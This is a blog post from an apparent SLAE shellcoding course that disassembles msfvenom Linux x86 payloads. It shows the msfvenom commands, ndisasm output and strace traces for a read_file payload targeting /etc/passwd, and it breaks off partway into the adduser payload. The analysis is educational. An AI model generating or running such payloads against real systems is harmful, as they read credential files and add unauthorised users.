<!doctype html><html lang=en><head><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><meta content="utf-8" http-equiv=encoding><link rel=preload href=/fonts/vollkorn/Vollkorn-VariableFont_wght.ttf as=font type=font/ttf crossorigin><link rel=stylesheet href=/css/bootstrap-grid.min.css type=text/css><link rel=stylesheet href=/css/main.css type=text/css><meta name=apple-mobile-web-app-title content="dubell.io | SLAE 5: Analyzing shellcode generated by msfvenom"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=twitter:site content="@dubs3c"><meta name=twitter:creator content="@dubs3c"><meta property="og:title" content="dubell.io | SLAE 5: Analyzing shellcode generated by msfvenom"><meta name=twitter:title content="dubell.io | SLAE 5: Analyzing shellcode generated by msfvenom"><meta itemprop=name content="dubell.io | SLAE 5: Analyzing shellcode generated by msfvenom"><meta name=application-name content="dubell.io | SLAE 5: Analyzing shellcode generated by msfvenom"><meta property="og:site_name" content="dubell.io"><meta property="og:article:published_time" content=2020-01-25T13:33:37Z><meta property="article:published_time" content=2020-01-25T13:33:37Z><base href=https://dubell.io/slae-5-analyzing-shellcode-generated-by-msfvenom/><link rel=canonical href=https://dubell.io/slae-5-analyzing-shellcode-generated-by-msfvenom/ itemprop=url><meta name=url content="https://dubell.io/slae-5-analyzing-shellcode-generated-by-msfvenom/"><meta name=twitter:url content="https://dubell.io/slae-5-analyzing-shellcode-generated-by-msfvenom/"><meta property="og:url" content="https://dubell.io/slae-5-analyzing-shellcode-generated-by-msfvenom/"><meta property="og:article:author" content="Dubs3c"><meta property="article:author" content="Dubs3c"><meta name=author content="Dubs3c"><meta name=description content="Analysis of msfvenom generated shellcode"><meta itemprop=description content="Analysis of msfvenom generated shellcode"><meta property="og:description" content="Analysis of msfvenom generated shellcode"><meta name=twitter:description content="Analysis of msfvenom generated shellcode"><meta itemprop=image content="https://dubell.io/slae-5-analyzing-shellcode-generated-by-msfvenom/hacker2.jpg"><meta property="og:image" content="https://dubell.io/slae-5-analyzing-shellcode-generated-by-msfvenom/hacker2.jpg"><meta name=twitter:image content="https://dubell.io/slae-5-analyzing-shellcode-generated-by-msfvenom/hacker2.jpg"><meta name=twitter:image:src content="https://dubell.io/slae-5-analyzing-shellcode-generated-by-msfvenom/hacker2.jpg"><meta property="og:updated_time" content=2020-01-25T13:33:37Z><link rel=sitemap type=application/xml title=Sitemap href=https://dubell.io/sitemap.xml><title>dubell.io | SLAE 5: Analyzing shellcode generated by msfvenom</title></head><body><div class=container><div class=row><div class=col><h1 class=logo-title><a href=/>dubell.io</a></h1></div></div><div class=row><div class=col><nav id=menu><ul><li><a href=/>/etc/motd</a></li><li><a href=/www/>/var/www</a></li><li><a href=/mnt/>/mnt</a></li><li><a href=/usr/>/usr</a></li></ul></nav></div></div><div class=row><article><h1>SLAE 5: Analyzing shellcode generated by msfvenom</h1><p><small><a href=/categories/programming>Programming</a> / January 25, 2020 â€¢ 14 min read</small><br><small><strong>Tags:</strong> <a href=/tags/slae class=tag>slae</a> <a href=/tags/shellcoding class=tag>shellcoding</a></small></p><div id=article_content><div class=row><div class=col-6><p>In this article, I will analyse three shellcode samples generated by msfvenom, specifically:</p><ul><li>linux/x86/read_file</li><li>linux/x86/adduser</li><li>linux/x86/shell/reverse_tcp</li></ul><pre tabindex=0><code>msfvenom --list payloads -a x86 --platform linux
</code></pre><p>Let&rsquo;s see if there is something new we can learn from these samples :)</p><h2 id=analyzing-linuxx86read_file>Analyzing linux/x86/read_file</h2><p>First, we generate the executable like so:</p><pre tabindex=0><code>msfvenom -p linux/x86/read_file -a x86 --platform linux PATH=/etc/passwd FD=2 -f elf -o read_file
</code></pre><p>I set the payload options <code>PATH</code> and <code>FD</code> to <code>/etc/passwd</code> and <code>2</code>. Executing the program outputs the contents of <code>/etc/passwd</code>.</p><pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/github/assignment_5$ ./read_file
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
...
</code></pre><p>Now that we know that the payload works, we can start analyzing it using a few simple tools.</p><p>With <code>ndisasm</code> we can disassemble the binary and analyze the assembly code.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#000>dubs3c@slae:</span><span style=color:#000>~/</span><span style=color:#000>SLAE</span><span style=color:#000>/</span><span style=color:#000>EXAM</span><span style=color:#000>/</span><span style=color:#000>github</span><span style=color:#000>/</span><span style=color:#000>assignment_5$</span> <span style=color:#000>msfvenom</span> -<span style=color:#000>p</span> <span style=color:#000>linux</span><span style=color:#000>/</span><span style=color:#000>x86</span><span style=color:#000>/</span><span style=color:#000>read_file</span> -<span style=color:#000>a</span> <span style=color:#000>x86</span> --<span style=color:#000>platform</span> <span style=color:#000>linux</span> <span style=color:#000>PATH</span><span style=color:#000>=/</span><span style=color:#000>etc</span><span style=color:#000>/</span><span style=color:#000>passwd</span> <span style=color:#000>FD</span><span style=color:#000>=</span><span style=color:#1c01ce>2</span> -<span style=color:#000>f</span> <span style=color:#000>raw</span> <span style=color:#000>|</span> <span style=color:#000>ndisasm</span> -<span style=color:#000>u</span> -
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#000>No</span> <span style=color:#000>encoder</span> <span style=color:#000>specified</span>, <span style=color:#000>outputting</span> <span style=color:#000>raw</span> <span style=color:#000>payload</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#000>Payload</span> <span style=color:#000>size</span>: <span style=color:#1c01ce>73</span> <span style=color:#000>bytes</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#000>00000000</span>  <span style=color:#000>EB36</span>              <span style=color:#000>jmp</span> <span style=color:#000>short</span> <span style=color:#1c01ce>0x38</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#000>00000002</span>  <span style=color:#000>B805000000</span>        <span style=color:#000>mov</span> <span style=color:#000>eax</span>,<span style=color:#1c01ce>0x5</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#000>00000007</span>  <span style=color:#000>5</span><span style=color:#000>B</span>                <span style=color:#000>pop</span> <span style=color:#000>ebx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#000>00000008</span>  <span style=color:#000>31</span><span style=color:#000>C9</span>              <span style=color:#000>xor</span> <span style=color:#000>ecx</span>,<span style=color:#000>ecx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#000>0000000</span><span style=color:#000>A</span>  <span style=color:#000>CD80</span>              <span style=color:#000>int</span> <span style=color:#1c01ce>0x80</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#000>0000000</span><span style=color:#000>C</span>  <span style=color:#1c01ce>89</span><span style=color:#000>C3</span>              <span style=color:#000>mov</span> <span style=color:#000>ebx</span>,<span style=color:#000>eax</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#000>0000000</span><span style=color:#000>E</span>  <span style=color:#000>B803000000</span>        <span style=color:#000>mov</span> <span style=color:#000>eax</span>,<span style=color:#1c01ce>0x3</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#000>00000013</span>  <span style=color:#000>89</span><span style=color:#000>E7</span>              <span style=color:#000>mov</span> <span style=color:#000>edi</span>,<span style=color:#000>esp</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#000>00000015</span>  <span style=color:#000>89</span><span style=color:#000>F9</span>              <span style=color:#000>mov</span> <span style=color:#000>ecx</span>,<span style=color:#000>edi</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#000>00000017</span>  <span style=color:#000>BA00100000</span>        <span style=color:#000>mov</span> <span style=color:#000>edx</span>,<span style=color:#1c01ce>0x1000</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#000>0000001</span><span style=color:#000>C</span>  <span style=color:#000>CD80</span>              <span style=color:#000>int</span> <span style=color:#1c01ce>0x80</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#000>0000001</span><span style=color:#000>E</span>  <span style=color:#1c01ce>89</span><span style=color:#000>C2</span>              <span style=color:#000>mov</span> <span style=color:#000>edx</span>,<span style=color:#000>eax</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#000>00000020</span>  <span style=color:#000>B804000000</span>        <span style=color:#000>mov</span> <span style=color:#000>eax</span>,<span style=color:#1c01ce>0x4</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#000>00000025</span>  <span style=color:#000>BB02000000</span>        <span style=color:#000>mov</span> <span style=color:#000>ebx</span>,<span style=color:#1c01ce>0x2</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#000>0000002</span><span style=color:#000>A</span>  <span style=color:#000>CD80</span>              <span style=color:#000>int</span> <span style=color:#1c01ce>0x80</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#000>0000002</span><span style=color:#000>C</span>  <span style=color:#000>B801000000</span>        <span style=color:#000>mov</span> <span style=color:#000>eax</span>,<span style=color:#1c01ce>0x1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#000>00000031</span>  <span style=color:#000>BB00000000</span>        <span style=color:#000>mov</span> <span style=color:#000>ebx</span>,<span style=color:#1c01ce>0x0</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#000>00000036</span>  <span style=color:#000>CD80</span>              <span style=color:#000>int</span> <span style=color:#1c01ce>0x80</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#000>00000038</span>  <span style=color:#000>E8C5FFFFFF</span>        <span style=color:#000>call</span> <span style=color:#000>dword</span> <span style=color:#1c01ce>0x2</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#000>0000003</span><span style=color:#000>D</span>  <span style=color:#1c01ce>2</span><span style=color:#000>F</span>                <span style=color:#000>das</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span><span style=color:#000>0000003</span><span style=color:#000>E</span>  <span style=color:#1c01ce>657463</span>            <span style=color:#000>gs</span> <span style=color:#000>jz</span> <span style=color:#1c01ce>0xa4</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span><span style=color:#000>00000041</span>  <span style=color:#000>2</span><span style=color:#000>F</span>                <span style=color:#000>das</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span><span style=color:#000>00000042</span>  <span style=color:#000>7061</span>              <span style=color:#000>jo</span> <span style=color:#1c01ce>0xa5</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span><span style=color:#000>00000044</span>  <span style=color:#000>7373</span>              <span style=color:#000>jnc</span> <span style=color:#1c01ce>0xb9</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span><span style=color:#000>00000046</span>  <span style=color:#000>7764</span>              <span style=color:#000>ja</span> <span style=color:#1c01ce>0xac</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span><span style=color:#000>00000048</span>  <span style=color:#000>00</span>                <span style=color:#000>db</span> <span style=color:#1c01ce>0x00</span>
</span></span></code></pre></div><p>Looking at the assembly output we can immediately recognize kernel interrupt instructions <em>(int x80)</em>, meaning the program is making use of syscalls. The specific syscall being called is often defined in <code>eax</code> and any arguments are placed in <code>ebx, ecx, edx</code>.</p><p>The first instruction is a jump to <code>0x38</code>, following the jump to address <code>00000038</code> we see that the next instruction is <code>call dword 0x2</code>. A <code>call</code> instruction will push the address of the next instruction to the stack. The call takes us back to the beginning of the shellcode, next instruction is <code>mov eax, 0x5</code> at address <code>00000002</code>. Placing <code>0x5</code> in <code>eax</code> specifies which syscall to execute. Checking in <code>usr/include/i386-linux-gnu/asm/unistd_32.h</code> which syscall corresponds to <code>0x5</code> returned:</p><pre tabindex=0><code>#define __NR_restart_syscall 0
#define __NR_exit 1
#define __NR_fork 2
#define __NR_read 3
#define __NR_write 4
#define __NR_open 5
#define __NR_close 6
#define __NR_waitpid 7
#define __NR_creat 8
#define __NR_link 9
#define __NR_unlink 10
...
</code></pre><p>The syscall is <code>__NR_open 5</code>. Running <code>man 2 open</code> reveals the following syntax for open:</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>[...]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span><span style=color:#a90d91>int</span> <span style=color:#000>open</span>(<span style=color:#a90d91>const</span> <span style=color:#a90d91>char</span> <span style=color:#000>*</span><span style=color:#000>pathname</span>, <span style=color:#a90d91>int</span> <span style=color:#000>flags</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span><span style=color:#a90d91>int</span> <span style=color:#000>open</span>(<span style=color:#a90d91>const</span> <span style=color:#a90d91>char</span> <span style=color:#000>*</span><span style=color:#000>pathname</span>, <span style=color:#a90d91>int</span> <span style=color:#000>flags</span>, <span style=color:#a90d91>mode_t</span> <span style=color:#000>mode</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>[...]
</span></span></code></pre></div><p>The first argument is the file path, next two arguments are flags and which mode that should be used. The <code>pop ebx</code> instruction pops the address on top of the stack into the <code>ebx</code> register. Now what does this address point to? Well, let&rsquo;s check what the hex values after the call instruction converts to:</p><pre tabindex=0><code>2F 657463 2F 7061 7373 7764 00 = /etc/passwd\0
</code></pre><p>The file that we want to open :)</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#000>00000002</span>  <span style=color:#000>B805000000</span>        <span style=color:#000>mov</span> <span style=color:#000>eax</span>,<span style=color:#1c01ce>0x5</span>     <span style=color:#177500>; open() syscall
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span><span style=color:#177500></span><span style=color:#000>00000007</span>  <span style=color:#000>5</span><span style=color:#000>B</span>                <span style=color:#000>pop</span> <span style=color:#000>ebx</span>         <span style=color:#177500>; filepath to open
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span><span style=color:#177500></span><span style=color:#000>00000008</span>  <span style=color:#000>31</span><span style=color:#000>C9</span>              <span style=color:#000>xor</span> <span style=color:#000>ecx</span>,<span style=color:#000>ecx</span>     <span style=color:#177500>; zero
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span><span style=color:#177500></span><span style=color:#000>0000000</span><span style=color:#000>A</span>  <span style=color:#000>CD80</span>              <span style=color:#000>int</span> <span style=color:#1c01ce>0x80</span>        <span style=color:#177500>; execute syscall
</span></span></span></code></pre></div><p>The next argument (flags) is 0 because <code>xor ecx, ecx</code> returns zero. Finally the syscall is executed and the result is stored in <code>eax</code>, which is a file descriptor.</p><p>Next section actually reads the contents of the file. This is done by moving the previous result (the file descriptor) into <code>ebx</code> which is the first argument for the READ syscall. <code>0x3</code> which corresponds to the <code>read()</code> syscall, is placed in <code>eax</code>. <code>ecx</code> contains the address where the contents will be stored, while <code>edx</code> indicates how many bytes to read, which is this case is 4096 (0x1000). <code>READ</code> will return the number of bytes read into <code>eax</code>.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#000>0000000</span><span style=color:#000>C</span>  <span style=color:#1c01ce>89</span><span style=color:#000>C3</span>              <span style=color:#000>mov</span> <span style=color:#000>ebx</span>,<span style=color:#000>eax</span>         <span style=color:#177500>; FD from open()
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span><span style=color:#177500></span><span style=color:#000>0000000</span><span style=color:#000>E</span>  <span style=color:#000>B803000000</span>        <span style=color:#000>mov</span> <span style=color:#000>eax</span>,<span style=color:#1c01ce>0x3</span>         <span style=color:#177500>; read() syscall
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span><span style=color:#177500></span><span style=color:#000>00000013</span>  <span style=color:#000>89</span><span style=color:#000>E7</span>              <span style=color:#000>mov</span> <span style=color:#000>edi</span>,<span style=color:#000>esp</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span><span style=color:#000>00000015</span>  <span style=color:#000>89</span><span style=color:#000>F9</span>              <span style=color:#000>mov</span> <span style=color:#000>ecx</span>,<span style=color:#000>edi</span>         <span style=color:#177500>; where to store contents
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span><span style=color:#177500></span><span style=color:#000>00000017</span>  <span style=color:#000>BA00100000</span>        <span style=color:#000>mov</span> <span style=color:#000>edx</span>,<span style=color:#1c01ce>0x1000</span>      <span style=color:#177500>; read 4096 bytes
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span><span style=color:#177500></span><span style=color:#000>0000001</span><span style=color:#000>C</span>  <span style=color:#000>CD80</span>              <span style=color:#000>int</span> <span style=color:#1c01ce>0x80</span>            <span style=color:#177500>; execute syscall
</span></span></span></code></pre></div><p>The final section writes the contents to <code>STDOUT</code> and then exits the program. The first four instructions sets up the <code>write()</code> syscall by placing <code>0x4</code> into <code>eax</code>, setting the first argument to <code>0x2</code> which is STDOUT and finally sets how many bytes to write in <code>edx</code>. The following three instructions simply exits the program by setting <code>eax</code> to the EXIT syscall.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#000>0000001</span><span style=color:#000>E</span>  <span style=color:#1c01ce>89</span><span style=color:#000>C2</span>              <span style=color:#000>mov</span> <span style=color:#000>edx</span>,<span style=color:#000>eax</span>         <span style=color:#177500>; bytes read from read() syscall
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span><span style=color:#177500></span><span style=color:#000>00000020</span>  <span style=color:#000>B804000000</span>        <span style=color:#000>mov</span> <span style=color:#000>eax</span>,<span style=color:#1c01ce>0x4</span>         <span style=color:#177500>; write() syscall
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span><span style=color:#177500></span><span style=color:#000>00000025</span>  <span style=color:#000>BB02000000</span>        <span style=color:#000>mov</span> <span style=color:#000>ebx</span>,<span style=color:#1c01ce>0x2</span>         <span style=color:#177500>; write to STDOUT
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span><span style=color:#177500></span><span style=color:#000>0000002</span><span style=color:#000>A</span>  <span style=color:#000>CD80</span>              <span style=color:#000>int</span> <span style=color:#1c01ce>0x80</span>            <span style=color:#177500>; execute syscall
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span><span style=color:#177500></span><span style=color:#000>0000002</span><span style=color:#000>C</span>  <span style=color:#000>B801000000</span>        <span style=color:#000>mov</span> <span style=color:#000>eax</span>,<span style=color:#1c01ce>0x1</span>         <span style=color:#177500>; exit() syscall
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span><span style=color:#177500></span><span style=color:#000>00000031</span>  <span style=color:#000>BB00000000</span>        <span style=color:#000>mov</span> <span style=color:#000>ebx</span>,<span style=color:#1c01ce>0x0</span>         <span style=color:#177500>; no error
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7</span><span><span style=color:#177500></span><span style=color:#000>00000036</span>  <span style=color:#000>CD80</span>              <span style=color:#000>int</span> <span style=color:#1c01ce>0x80</span>            <span style=color:#177500>; execute syscall
</span></span></span></code></pre></div><p>You can also inspect the binary by running it with <code>strace</code>, which shows you all the functions invocations and values:</p><pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/github/assignment_5$ strace ./read_file
execve(&#34;./read_file&#34;, [&#34;./read_file&#34;], [/* 22 vars */]) = 0
open(&#34;/etc/passwd&#34;, O_RDONLY)           = 3
read(3, &#34;root:x:0:0:root:/root:/bin/bash\n&#34;..., 4096) = 1888
write(2, &#34;root:x:0:0:root:/root:/bin/bash\n&#34;..., 1888root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
[...]
</code></pre><p>Now we have finished analyzing the first shellcode created by msfvenom, let&rsquo;s move on to the next one!</p><h2 id=linuxx86adduser>linux/x86/adduser</h2><p>Next payload generated by <code>msfvenom</code> is the <code>adduser</code> shellcode. Let&rsquo;s start by examining the first five instructions.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#000>00000000</span>  <span style=color:#000>31</span><span style=color:#000>C9</span>              <span style=color:#000>xor</span> <span style=color:#000>ecx</span>,<span style=color:#000>ecx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#000>00000002</span>  <span style=color:#000>89</span><span style=color:#000>CB</span>              <span style=color:#000>mov</span> <span style=color:#000>ebx</span>,<span style=color:#000>ecx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#000>00000004</span>  <span style=color:#000>6</span><span style=color:#000>A46</span>              <span style=color:#000>push</span> <span style=color:#000>byte</span> <span style=color:#000>+</span><span style=color:#1c01ce>0x46</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#000>00000006</span>  <span style=color:#000>58</span>                <span style=color:#000>pop</span> <span style=color:#000>eax</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#000>00000007</span>  <span style=color:#000>CD80</span>              <span style=color:#000>int</span> <span style=color:#1c01ce>0x80</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#000>00000009</span>  <span style=color:#000>6</span><span style=color:#000>A05</span>              <span style=color:#000>push</span> <span style=color:#000>byte</span> <span style=color:#000>+</span><span style=color:#1c01ce>0x5</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#000>0000000</span><span style=color:#000>B</span>  <span style=color:#1c01ce>58</span>                <span style=color:#000>pop</span> <span style=color:#000>eax</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#000>0000000</span><span style=color:#000>C</span>  <span style=color:#1c01ce>31</span><span style=color:#000>C9</span>              <span style=color:#000>xor</span> <span style=color:#000>ecx</span>,<span style=color:#000>ecx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#000>0000000</span><span style=color:#000>E</span>  <span style=color:#1c01ce>51</span>                <span style=color:#000>push</span> <span style=color:#000>ecx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#000>0000000</span><span style=color:#000>F</span>  <span style=color:#1c01ce>6873737764</span>        <span style=color:#000>push</span> <span style=color:#000>dword</span> <span style=color:#1c01ce>0x64777373</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#000>00000014</span>  <span style=color:#000>682</span><span style=color:#000>F2F7061</span>        <span style=color:#000>push</span> <span style=color:#000>dword</span> <span style=color:#1c01ce>0x61702f2f</span>
